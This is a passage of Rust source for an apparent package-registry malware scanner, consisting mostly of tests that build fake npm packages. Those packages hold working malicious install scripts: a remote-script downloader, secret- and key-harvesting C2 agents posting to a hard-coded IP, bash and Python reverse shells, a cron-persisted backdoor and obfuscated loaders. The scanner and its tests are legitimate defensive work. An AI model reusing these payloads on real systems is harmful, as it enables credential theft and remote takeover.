                file_path: target.path.clone(),
                file_role: target.role.as_str().to_string(),
                matched_patterns: matched_patterns.into_iter().collect(),
                pattern_matches,
                evidence_kind,
                description,
            });
        }
    }

    matches.sort_by(|left, right| {
        right
            .score
            .cmp(&left.score)
            .then(left.rule_id.cmp(&right.rule_id))
            .then(left.file_path.cmp(&right.file_path))
    });
    Ok(matches)
}

fn module_scan_options(ecosystem: Ecosystem) -> ScanOptions<'static> {
    ScanOptions::new()
        .set_module_metadata(
            "npm",
            if ecosystem == Ecosystem::Npm {
                NPM_MODULE_META
            } else {
                DISABLED_MODULE_META
            },
        )
        .set_module_metadata(
            "pypi",
            if ecosystem == Ecosystem::Pypi {
                PYPI_MODULE_META
            } else {
                DISABLED_MODULE_META
            },
        )
        .set_module_metadata(
            "crate",
            if ecosystem == Ecosystem::CratesIo {
                CRATE_MODULE_META
            } else {
                DISABLED_MODULE_META
            },
        )
}

fn match_preview(bytes: &[u8]) -> String {
    let preview = &bytes[..bytes.len().min(DEFAULT_MATCH_PREVIEW_BYTES)];
    if looks_like_text(preview) {
        let text = String::from_utf8_lossy(preview)
            .chars()
            .map(|ch| match ch {
                '\n' => "\\n".to_string(),
                '\r' => "\\r".to_string(),
                '\t' => "\\t".to_string(),
                ch if ch.is_control() => " ".to_string(),
                ch => ch.to_string(),
            })
            .collect::<String>();
        if bytes.len() > preview.len() {
            format!("{text}...")
        } else {
            text
        }
    } else {
        let mut hex = String::with_capacity(preview.len() * 2 + 8);
        for byte in preview {
            use std::fmt::Write as _;
            let _ = write!(&mut hex, "{byte:02x}");
        }
        if bytes.len() > preview.len() {
            format!("hex:{hex}...")
        } else {
            format!("hex:{hex}")
        }
    }
}

fn apply_globals(
    scanner: &mut Scanner<'_>,
    package_context: &PackageScanContext,
    target: &ScanTarget,
) -> Result<()> {
    scanner
        .set_global("ecosystem", package_context.ecosystem.as_str())?
        .set_global("package_name", package_context.package_name.as_str())?
        .set_global("package_version", package_context.package_version.as_str())?
        .set_global("file_path", target.path.as_str())?
        .set_global("file_role", target.role.as_str())?
        .set_global("is_archive", target.role == FileRole::Archive)?
        .set_global("is_manifest", target.role == FileRole::Manifest)?
        .set_global("is_install_script", target.role == FileRole::InstallScript)?
        .set_global("is_build_script", target.role == FileRole::BuildScript)?
        .set_global("is_entrypoint", target.role == FileRole::Entrypoint)?
        .set_global("is_binary", target.role == FileRole::Binary)?
        .set_global("is_npm", package_context.ecosystem == Ecosystem::Npm)?
        .set_global("is_pypi", package_context.ecosystem == Ecosystem::Pypi)?
        .set_global(
            "is_crates",
            package_context.ecosystem == Ecosystem::CratesIo,
        )?
        .set_global("has_install_script", package_context.has_install_script)?
        .set_global("has_build_script", package_context.has_build_script)?
        .set_global("has_bin", package_context.has_bin)?
        .set_global("has_repository", package_context.has_repository)?
        .set_global("windows_target", package_context.windows_target)?
        .set_global("dependency_count", package_context.dependency_count as i64)?
        .set_global(
            "dep_primno_dpapi",
            package_context.dependency_flags.primno_dpapi,
        )?
        .set_global("dep_koffi", package_context.dependency_flags.koffi)?
        .set_global("dep_sqlite3", package_context.dependency_flags.sqlite3)?
        .set_global(
            "dep_screenshot_desktop",
            package_context.dependency_flags.screenshot_desktop,
        )?
        .set_global("dep_rcedit", package_context.dependency_flags.rcedit)?
        .set_global("dep_archiver", package_context.dependency_flags.archiver)?
        .set_global("dep_adm_zip", package_context.dependency_flags.adm_zip)?
        .set_global("dep_tar", package_context.dependency_flags.tar)?
        .set_global("dep_ws", package_context.dependency_flags.ws)?
        .set_global("dep_axios", package_context.dependency_flags.axios)?
        .set_global("dep_form_data", package_context.dependency_flags.form_data)?;
    Ok(())
}

fn extract_iocs(scan_targets: &[ScanTarget]) -> Vec<ContentRiskIoc> {
    let mut iocs = BTreeSet::new();

    for target in scan_targets.iter().filter(|target| target.text) {
        let content = String::from_utf8_lossy(&target.bytes);
        for value in URL_REGEX.find_iter(&content) {
            iocs.insert(ContentRiskIoc {
                kind: "url".to_string(),
                value: value.as_str().to_string(),
                file_path: Some(target.path.clone()),
            });
        }
        for value in DISCORD_WEBHOOK_REGEX.find_iter(&content) {
            iocs.insert(ContentRiskIoc {
                kind: "discord_webhook".to_string(),
                value: value.as_str().to_string(),
                file_path: Some(target.path.clone()),
            });
        }
        for value in TELEGRAM_TOKEN_REGEX.find_iter(&content) {
            iocs.insert(ContentRiskIoc {
                kind: "telegram_bot_token".to_string(),
                value: value.as_str().to_string(),
                file_path: Some(target.path.clone()),
            });
        }
        for value in IPV4_REGEX.find_iter(&content) {
            iocs.insert(ContentRiskIoc {
                kind: "ipv4".to_string(),
                value: value.as_str().to_string(),
                file_path: Some(target.path.clone()),
            });
        }
        for marker in [
            (
                "windows_run_key",
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            ),
            ("windows_startup_folder", "Start Menu\\Programs\\Startup"),
            ("defender_exclusion", "Add-MpPreference"),
            ("wscript", "wscript.exe"),
        ] {
            if content.contains(marker.1) {
                iocs.insert(ContentRiskIoc {
                    kind: marker.0.to_string(),
                    value: marker.1.to_string(),
                    file_path: Some(target.path.clone()),
                });
            }
        }
    }

    iocs.into_iter().collect()
}

fn content_risk_rules_dir() -> PathBuf {
    if let Some(path) = std::env::var_os("SUPPLY_STREAM_CONTENT_RISK_RULES_DIR").map(PathBuf::from)
    {
        return path;
    }

    let direct = PathBuf::from(DEFAULT_RULES_DIR);
    if direct.exists() {
        return direct;
    }

    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("..")
        .join(DEFAULT_RULES_DIR)
}

#[cfg(test)]
mod tests {
    use std::fs;
    use std::io;
    use std::path::{Path, PathBuf};
    use std::process::Command as ProcessCommand;

    use flate2::{Compression, write::GzEncoder};
    use serde_json::json;
    use tar::{Builder, Header};
    use tempfile::tempdir;
    use zip::CompressionMethod;
    use zip::write::FileOptions;

    use super::*;
    use crate::capture::CapturedRelease;
    use chrono::Utc;

    #[tokio::test]
    async fn detects_consolelofy_manifest_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "separadordeinfocc",
                        "version": "1.0.0",
                        "main": "index.js",
                        "bin": "index.js",
                        "author": "ConsoleLofy",
                        "packageManager": "pnpm@10.8.0",
                        "pkg": {
                            "targets": ["node20-win-x64"]
                        },
                        "dependencies": {
                            "@primno/dpapi": "^1.0.2",
                            "koffi": "^2.0.0",
                            "sqlite3": "^5.0.0",
                            "screenshot-desktop": "^1.0.0",
                            "rcedit": "^3.0.0",
                            "archiver": "^7.0.0",
                            "adm-zip": "^0.5.0",
                            "ws": "^8.0.0"
                        }
                    }))
                    .unwrap(),
                ),
                ("index.js", "const ws='ws://18.231.131.246:80';"),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "separadordeinfocc");
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_consolelofy_stealer_manifest")
        );
    }

    #[tokio::test]
    async fn rejects_tar_symlink_entries_during_extraction() {
        let temp = tempdir().unwrap();
        let archive_path = temp.path().join("bad.tgz");
        let archive_file = fs::File::create(&archive_path).unwrap();
        let encoder = GzEncoder::new(archive_file, Compression::default());
        let mut builder = Builder::new(encoder);

        let mut header = Header::new_gnu();
        header.set_entry_type(tar::EntryType::Symlink);
        header.set_mode(0o777);
        header.set_size(0);
        header.set_link_name("../outside").unwrap();
        header.set_cksum();
        builder
            .append_data(&mut header, "package/link", io::empty())
            .unwrap();
        builder.finish().unwrap();

        let destination = temp.path().join("extract");
        let error = extract_artifact(&archive_path, &destination, ArtifactKind::TarGz)
            .await
            .unwrap_err();
        assert!(!error.to_string().is_empty());
        assert!(!destination.join("package/link").exists());
    }

    #[tokio::test]
    async fn rejects_zip_path_traversal_entries_during_extraction() {
        let temp = tempdir().unwrap();
        let archive_path = temp.path().join("bad.zip");
        let file = fs::File::create(&archive_path).unwrap();
        let mut writer = zip::ZipWriter::new(file);
        let options: FileOptions<'_, ()> =
            FileOptions::default().compression_method(CompressionMethod::Deflated);
        writer.start_file("../evil.txt", options).unwrap();
        std::io::Write::write_all(&mut writer, b"owned").unwrap();
        writer.finish().unwrap();

        let destination = temp.path().join("extract");
        let error = extract_artifact(&archive_path, &destination, ArtifactKind::Zip)
            .await
            .unwrap_err();
        assert!(error.to_string().contains("invalid path"));
    }

    #[tokio::test]
    async fn detects_base64_xor_self_unpacking_loader_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "stealth-loader",
                        "version": "1.0.0",
                        "main": "index.js",
                        "bin": "index.js"
                    }))
                    .unwrap(),
                ),
                (
                    "index.js",
                    "const _k='secret';const _d=Buffer.from('ZmFrZQ==','base64'),_r=Buffer.alloc(_d.length);for(let _i=0;_i<_d.length;_i++)_r[_i]=_d[_i]^_k.charCodeAt(_i%_k.length);new Function(\"require\",\"module\",\"exports\",\"__filename\",\"__dirname\",_r.toString(\"utf-8\"))(require,module,exports,__filename,__dirname);",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "stealth-loader");
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_base64_xor_self_unpacking_loader")
        );
    }

    #[tokio::test]
    async fn detects_nyx_hidden_obfuscated_loader_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "undicy-http",
                        "version": "2.0.0",
                        "main": "index.js",
                        "bin": "index.js",
                        "author": "ConsoleLofy",
                        "pkg": {
                            "targets": ["node20-win-x64"]
                        },
                        "dependencies": {
                            "@primno/dpapi": "^2.0.1",
                            "koffi": "^2.15.2",
                            "sqlite3": "^5.1.7",
                            "screenshot-desktop": "^1.15.3",
                            "rcedit": "^4.0.1",
                            "ws": "^8.18.2"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "index.js",
                    "(function(_0xf39ff6,_0x49bad6){const a0_0x468d68={_0xb97759:'\\\\x36\\\\x42\\\\x50\\\\x5d'};})();if(!process.env._NYX_HIDDEN){console.log('hidden');}",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "undicy-http");
        capture.version = "2.0.0".to_string();
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_nyx_hidden_obfuscated_loader")
        );
    }

    #[tokio::test]
    async fn detects_openclaw_install_script_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "@shadanai/openclaw",
                        "version": "2026.3.31-3",
                        "scripts": {
                            "postinstall": "node ./scripts/postinstall.mjs"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "scripts/postinstall.mjs",
                    "const FIXED_GATEWAY_TOKEN='x'; const FIXED_ZAI_API_KEY='y'; const path='.openclaw/.env'; const tool='mkcert';",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "@shadanai/openclaw");
        capture.details["has_install_scripts"] = json!(true);
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_openclaw_hardcoded_installer_secrets")
        );
    }

    #[tokio::test]
    async fn detects_npm_native_credential_theft_toolchain_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "native-stealer",
                        "version": "1.0.0",
                        "main": "index.js",
                        "bin": "index.js",
                        "pkg": {
                            "targets": ["node20-win-x64"]
                        },
                        "dependencies": {
                            "@primno/dpapi": "^1.0.0",
                            "sqlite3": "^5.0.0",
                            "archiver": "^7.0.0",
                            "rcedit": "^4.0.0",
                            "ws": "^8.0.0"
                        }
                    }))
                    .unwrap(),
                ),
                ("index.js", "const state='Local State'; console.log(state);"),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "native-stealer");
        capture.details["bin"] = json!("index.js");
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "npm_native_credential_theft_toolchain" })
        );
    }

    #[tokio::test]
    async fn detects_npmamzs_downloader_installer_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "npmamzs",
                        "version": "1.1.4",
                        "main": "index.js",
                        "type": "commonjs",
                        "scripts": {
                            "postinstall": "node ./index.js"
                        },
                        "dependencies": {
                            "npmamzs": "^1.1.2"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "index.js",
                    "// Runs automatically when package is installed\nconst { exec } = require('child_process');\nconst https = require('https');\nconst service = 'https://reunionistic-keagan-unfestively.ngrok-free.dev/rev.sh';\nhttps.get(service, (res) => {\n  let data = '';\n  res.on('data', chunk => data += chunk);\n  res.on('end', () => {\n    exec(`bash -c \"${data}\"`, { detached: true });\n  });\n  console.log(service)\n});\n",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "npmamzs");
        capture.version = "1.1.4".to_string();
        capture.details["has_install_scripts"] = json!(true);
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_downloader_and_exec_installer")
        );
    }

    #[tokio::test]
    async fn detects_remote_shell_installer_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "@modular-prompt/driver",
                        "version": "0.10.6",
                        "scripts": {
                            "postinstall": "node scripts/setup-mlx.js"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "scripts/setup-mlx.js",
                    "const { execSync } = require('child_process'); execSync('curl -LsSf https://astral.sh/uv/install.sh | sh', { stdio: 'inherit' });",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "@modular-prompt/driver");
        capture.version = "0.10.6".to_string();
        capture.details["has_install_scripts"] = json!(true);
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_downloader_pipe_to_shell_installer")
        );
    }

    #[tokio::test]
    async fn detects_npm_install_environment_callback_probe_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "talos-fn",
                        "version": "99.0.2",
                        "scripts": {
                            "preinstall": "node callback.js"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "callback.js",
                    "const https = require('https'); const dns = require('dns'); const os = require('os'); const { execSync } = require('child_process'); const data = { hostname: os.hostname(), home: os.homedir(), tmpdir: os.tmpdir(), net: os.networkInterfaces(), path: process.env.PATH, user: execSync('whoami').toString(), dns: execSync('cat /etc/resolv.conf').toString() }; dns.resolve('probe.example.oast.fun', () => {}); const req = https.request({ hostname: 'probe.example.oast.fun', path: '/cb', method: 'POST' }, () => {}); req.write(JSON.stringify(data)); req.end();",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "talos-fn");
        capture.version = "99.0.2".to_string();
        capture.details["has_install_scripts"] = json!(true);
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "npm_install_environment_callback_probe" })
        );
    }

    #[tokio::test]
    async fn detects_npm_install_secrets_harvesting_c2_agent_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "strapi-plugin-events",
                        "version": "3.6.8",
                        "scripts": {
                            "postinstall": "node postinstall.js"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "postinstall.js",
                    "var http = require('http'); var exec = require('child_process').execSync; var fs = require('fs'); var VPS = '144.31.107.231'; var PORT = 9999; function post(path, data) { var body = typeof data === 'string' ? data : JSON.stringify(data); var req = http.request({ hostname: VPS, port: PORT, path: path, method: 'POST', headers: { 'Content-Type': 'text/plain', 'Content-Length': Buffer.byteLength(body) } }, function() {}); req.write(body); req.end(); } async function main() { var info = { hostname: exec('hostname').trim(), whoami: exec('whoami').trim() }; await post('/c2/guard/beacon', info); var envBody = fs.readFileSync('/app/.env', 'utf8'); await post('/c2/guard/env', envBody); var allEnv = exec(\"find / -maxdepth 5 -name '.env*' -type f 2>/dev/null\"); await post('/c2/guard/allenv', allEnv); var net = require('net'); var redis = await new Promise(function(resolve) { var c = new net.Socket(); c.connect(6379, '127.0.0.1', function() { c.write('INFO server\\r\\nDBSIZE\\r\\nKEYS *\\r\\n'); }); setTimeout(function() { c.destroy(); resolve('done'); }, 5000); }); await post('/c2/guard/redis-full', redis); var docker = exec('ls -la /var/run/docker.sock 2>/dev/null; cat /run/secrets/* 2>/dev/null; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null'); await post('/c2/guard/docker', docker); var keys = exec(\"find / -maxdepth 4 \\\\( -name '*.pem' -o -name '*.key' -o -name 'id_rsa*' -o -name 'wallet*' -o -name '*private*' -o -name '*secret*' \\\\) -type f 2>/dev/null\"); var firstKey = fs.readFileSync('/home/node/id_rsa', 'utf8'); await post('/c2/guard/keys', keys + firstKey); for (var round = 0; round < 60; round++) { var cmd = await post('/c2/guard/poll', JSON.stringify({ round: round })); await new Promise(function(r) { setTimeout(r, 5000); }); } } main();",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "strapi-plugin-events");
        capture.version = "3.6.8".to_string();
        capture.details["has_install_scripts"] = json!(true);
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "npm_install_secrets_harvesting_c2_agent" })
        );
    }

    #[tokio::test]
    async fn detects_npm_install_multiphase_secrets_exfil_agent_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "strapi-plugin-monitor",
                        "version": "3.6.8",
                        "scripts": {
                            "postinstall": "node postinstall.js"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "postinstall.js",
                    "var http = require('http'); var exec = require('child_process').execSync; var fs = require('fs'); var VPS = '144.31.107.231'; var PORT = 9999; function post(path, data) { var body = typeof data === 'string' ? data : JSON.stringify(data); var req = http.request({ hostname: VPS, port: PORT, path: path, method: 'POST', headers: { 'Content-Type': 'text/plain', 'Content-Length': Buffer.byteLength(body) } }, function() {}); req.write(body); req.end(); } async function main() { var envBody = fs.readFileSync('/app/.env', 'utf8'); await post('/c2/guard/env', envBody); var redisInfo = exec('env | grep -iE \"database|postgres|redis|mongo|mysql|db_\" 2>/dev/null'); await post('/c2/guard/db', redisInfo); var net = require('net'); var redis = await new Promise(function(resolve) { var c = new net.Socket(); c.connect(6379, '127.0.0.1', function() { c.write('INFO\\r\\nKEYS *\\r\\n'); }); setTimeout(function() { c.destroy(); resolve('done'); }, 5000); }); await post('/c2/guard/redis', redis); var wallets = exec(\"find / -maxdepth 4 -name '*.pem' -o -name '*.key' -o -name 'wallet*' -o -name '*secret*' -o -name '*private*' 2>/dev/null\"); await post('/c2/guard/wallets', wallets); for (var round = 0; round < 5; round++) { await post('/c2/guard/poll', JSON.stringify({ round: round })); await new Promise(function(r) { setTimeout(r, 5000); }); } } main();",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "strapi-plugin-monitor");
        capture.version = "3.6.8".to_string();
        capture.details["has_install_scripts"] = json!(true);
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_install_multiphase_secrets_exfil_agent")
        );
    }

    #[tokio::test]
    async fn detects_npm_install_redis_reverse_shell_dropper_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "strapi-plugin-config",
                        "version": "3.6.8",
                        "scripts": {
                            "postinstall": "node postinstall.js"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "postinstall.js",
                    "var http = require('http'); var execSync = require('child_process').execSync; var net = require('net'); var VPS = '144.31.107.231'; var PORT = 9999; function redisCmd(commands) { return new Promise(function(resolve) { var client = new net.Socket(); client.connect(6379, '127.0.0.1', function() { client.write(commands); }); setTimeout(function() { client.destroy(); resolve('ok'); }, 5000); }); } async function main() { execSync('curl -s http://' + VPS + ':' + PORT + '/shell.sh -o /tmp/shell.sh'); await redisCmd('CONFIG SET dir /var/lib/redis\\r\\nCONFIG SET dbfilename shell.sh\\r\\n'); execSync('nohup bash -c \"bash -i >& /dev/tcp/' + VPS + '/4444 0>&1\" &>/dev/null &'); execSync('nohup python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\'' + VPS + '\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\'/bin/bash\\',\\'-i\\'])\" &>/dev/null &'); } main();",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "strapi-plugin-config");
        capture.version = "3.6.8".to_string();
        capture.details["has_install_scripts"] = json!(true);
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_install_redis_reverse_shell_dropper")
        );
    }

    #[tokio::test]
    async fn detects_npm_install_persistent_shell_backdoor_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "strapi-plugin-api",
                        "version": "3.6.8",
                        "scripts": {
                            "postinstall": "node postinstall.js"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "postinstall.js",
                    "var http=require('http'),cp=require('child_process'),fs=require('fs'); var c2script = `var http=require('http');var exec=require('child_process').execSync;var VPS='144.31.107.231';function poll(){var req=http.request({hostname:VPS,port:9999,path:'/shell/poll',method:'POST',headers:{'Content-Type':'text/plain','Content-Length':2}},function(res){var d='';res.on('data',function(c){d+=c});res.on('end',function(){if(d&&d.trim()&&d.trim()!=='nop'){try{var r=exec(d.trim(),{timeout:30000,encoding:'utf8',maxBuffer:5e6});send('/shell/result',r);}catch(e){}}setTimeout(poll,3000);});});req.on('error',function(){setTimeout(poll,10000)});req.write('{}');req.end();}function send(p,d){var req=http.request({hostname:VPS,port:9999,path:p,method:'POST'});req.on('error',function(){});req.write(d);req.end();}poll();`; fs.writeFileSync('/tmp/.node_gc.js', c2script); var child = cp.spawn('node', ['/tmp/.node_gc.js'], { detached: true, stdio: 'ignore', env: process.env }); child.unref(); cp.execSync('(crontab -l 2>/dev/null; echo \"* * * * * pgrep -f node_gc || node /tmp/.node_gc.js &\") | sort -u | crontab -', {timeout:5000});",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "strapi-plugin-api");
        capture.version = "3.6.8".to_string();
        capture.details["has_install_scripts"] = json!(true);
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_install_persistent_shell_backdoor")
        );
    }

    #[tokio::test]
    async fn detects_npm_runtime_environment_callback_probe_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "vv-ftend-core",
                        "version": "99.0.0",
                        "main": "index.js",
                        "bin": {
                            "vv-ftend-core": "index.js"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "index.js",
                    "const https = require('https'); const dns = require('dns'); const os = require('os'); const { execSync } = require('child_process'); const payload = { hostname: os.hostname(), user: os.userInfo().username, home: os.homedir(), tmp: os.tmpdir(), net: os.networkInterfaces(), cwd: process.cwd(), pid: process.pid, argv: process.argv, path: process.env.PATH, whoami: execSync('whoami').toString(), dns: execSync('cat /etc/resolv.conf').toString() }; dns.getServers(); const req = https.request({ hostname: 'cb.example.oast.fun', path: '/fingerprint', method: 'POST' }, () => {}); req.write(JSON.stringify(payload)); req.end();",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "vv-ftend-core");
        capture.version = "99.0.0".to_string();
        capture.details["bin"] = json!({ "vv-ftend-core": "index.js" });
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "npm_runtime_environment_callback_probe" })
        );
    }

    #[tokio::test]
    async fn detects_npm_runtime_encoded_remote_loader_rule() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "winston-prism",
                        "version": "1.0.1",
                        "main": "lib/winston_prisma.js"
                    }))
                    .unwrap(),
                ),
                (
                    "lib/winston_prisma.js",
                    "exports.prismalogger = require('./winston_prisma/prismalogger');",
                ),
                (
                    "lib/winston_prisma/prismalogger.js",
                    "const axios = require('axios'); const process = { env: { DEV_API_KEY: 'aHR0cHM6Ly9leGFtcGxlLmNvbS9sb2FkZXI=', DEV_SECRET_KEY: 'eC1zZWNyZXQta2V5', DEV_SECRET_VALUE: 'Xw==' } }; (async function run() { const src = atob(process.env.DEV_API_KEY); const k = atob(process.env.DEV_SECRET_KEY); const v = atob(process.env.DEV_SECRET_VALUE); const s = (await axios.get(src, { headers: { [k]: v } })).data.logger; const handler = new Function.constructor('require', s); handler(require); })();",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "winston-prism");
        capture.version = "1.0.1".to_string();
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_runtime_encoded_remote_loader")
        );
    }

    #[tokio::test]
    async fn ignores_runtime_encoded_remote_config_without_dynamic_loader_execution() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "encoded-runtime-config",
                        "version": "1.0.0",
                        "main": "lib/index.js"
                    }))
                    .unwrap(),
                ),
                ("lib/index.js", "module.exports = require('./client');"),
                (
                    "lib/client.js",
                    "const axios = require('axios'); async function load() { const src = atob('aHR0cHM6Ly9leGFtcGxlLmNvbS9jb25maWc='); const cfg = (await axios.get(src)).data; return cfg; } module.exports = { load };",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "encoded-runtime-config");
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_runtime_encoded_remote_loader")
        );
    }

    #[tokio::test]
    async fn ignores_bundled_remote_registry_client_with_vendored_codegen() {
        let temp = tempdir().unwrap();
        let archive = write_npm_archive(
            temp.path(),
            &[
                (
                    "package.json",
                    &serde_json::to_string_pretty(&json!({
                        "name": "godd-like-client",
                        "version": "0.1.0",
                        "main": "dist/godd.js",
                        "bin": {
                            "godd": "dist/godd.js"
                        }
                    }))
                    .unwrap(),
                ),
                (
                    "dist/godd.js",
                    "async function fetchBundle() { const url = atob('aHR0cHM6Ly9leGFtcGxlLmNvbS9yZWdpc3RyeQ=='); const res = await fetch(url, { headers: { Authorization: 'Bearer token' } }); return res.json(); } function compileSchema(scope, code) { return new Function('self', 'scope', code); } module.exports = { fetchBundle, compileSchema };",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::Npm, "godd-like-client");
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "npm_runtime_encoded_remote_loader")
        );
    }

